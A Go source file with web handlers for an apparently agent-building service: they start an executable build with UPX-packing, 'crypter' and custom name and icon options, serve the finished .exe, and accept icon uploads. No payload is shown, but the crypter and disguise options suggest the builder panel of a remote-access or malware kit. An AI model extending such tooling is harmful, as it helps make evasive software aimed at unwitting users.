package builder

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/labstack/echo/v4"

	"agentmanager/modules/apperr"
)

type Handler struct {
	svc *Service
}

func NewHandler(svc *Service) *Handler {
	return &Handler{svc: svc}
}

func (h *Handler) StartBuild(c echo.Context) error {
	var req struct {
		Debug       bool   `json:"debug"`
		UPX         bool   `json:"upx"`
		Crypter     bool   `json:"crypter"`
		DisplayName string `json:"display_name"`
		IconPath    string `json:"icon_path"`
	}
	if err := c.Bind(&req); err != nil {
		return apperr.JSON(c, http.StatusBadRequest, ErrInvalidRequest)
	}
	uid := c.Get("auth_user_id").(string)
	if req.DisplayName == "" {
		req.DisplayName = "My Agent"
	}
	if err := h.svc.Start(req.Debug, req.UPX, req.Crypter, req.DisplayName, req.IconPath, uid); err != nil {
		return apperr.JSON(c, http.StatusConflict, err)
	}
	return c.JSON(http.StatusOK, echo.Map{"ok": true})
}

func (h *Handler) DownloadExe(c echo.Context) error {
	uid := c.Get("auth_user_id").(string)
	file := c.Param("file")
	if file == "" || strings.Contains(file, "..") || strings.Contains(file, "/") || strings.Contains(file, "\\") {
		return apperr.JSON(c, http.StatusNotFound, ErrNotFound)
	}
	path := filepath.Join(h.svc.BuildsDir(), uid, file)
	if _, err := os.Stat(path); err != nil {
		return apperr.JSON(c, http.StatusNotFound, ErrBuildNotFound)
	}
	go func() {
		time.Sleep(10 * time.Minute)
		os.RemoveAll(filepath.Join(h.svc.BuildsDir(), uid))
	}()
	return c.Attachment(path, file)
}

func (h *Handler) UploadIcon(c echo.Context) error {
	uid := c.Get("auth_user_id").(string)
	file, err := c.FormFile("icon")
	if err != nil {
		return apperr.JSON(c, http.StatusBadRequest, ErrNoIcon)
	}
	if !strings.HasSuffix(strings.ToLower(file.Filename), ".ico") {
		return apperr.JSON(c, http.StatusBadRequest, ErrIconType)
	}
	if file.Size > 25*1024*1024 {
		return apperr.JSON(c, http.StatusBadRequest, ErrIconTooLarge)
	}
	path, err := h.svc.SaveIcon(file, uid)
	if err != nil {
		return apperr.JSON(c, http.StatusInternalServerError, err)
	}
	return c.JSON(http.StatusOK, echo.Map{"ok": true, "path": path})
}
